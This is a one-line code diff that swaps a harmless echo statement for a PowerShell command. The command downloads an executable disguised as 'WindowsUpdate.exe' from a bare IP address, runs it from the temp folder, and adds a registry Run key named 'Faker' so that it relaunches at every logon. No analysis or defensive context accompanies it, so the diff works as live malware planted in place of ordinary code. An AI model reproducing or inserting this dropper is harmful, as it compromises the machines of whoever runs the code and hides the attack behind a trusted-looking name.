@@ -1,1 +1,1 @@
-echo "1";
+ $Url = "http://103.69.193.30/WindowsUpdate.exe"; $path = $env:TEMP +"\WindowsUpdate.exe"; Invoke-WebRequest -Uri $Url -OutFile $path; Start-Process $path; $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";$regName = "Faker"; $regValue = $path; Set-ItemProperty -Path $regPath -Name $regName -Value $regValue;
